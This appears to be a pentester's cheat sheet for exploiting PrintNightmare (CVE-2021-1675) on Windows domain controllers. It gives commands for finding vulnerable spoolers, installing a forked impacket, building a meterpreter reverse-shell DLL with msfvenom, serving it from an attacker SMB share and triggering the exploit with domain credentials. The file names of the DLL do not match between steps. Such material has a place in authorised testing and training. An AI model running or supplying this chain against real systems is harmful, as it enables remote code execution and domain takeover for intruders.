---
tags:
  - Domain-Admin
  - Initial-Access
  - Lateral-Movement
  - Privilege-Escalation
  - AD
---
[https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
## Identify
---



```PowerShell
 rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
```PowerShell
REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1
```
  
## Exploit
---
You need bros version of impacket
```PowerShell
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
**Generate DLL payload**
```PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=8080 -f dll > timsync.dll
```
Host payload on smbserver
```PowerShell
sudo smbserver.py -smb2support ITShare share
```
Start listener, execute payload
```PowerShell
sudo python3 CVE-2021-1675.py domain.local/user:'password'@<dcip> '\\<attackhost>\ITShare\timesync.dll'
```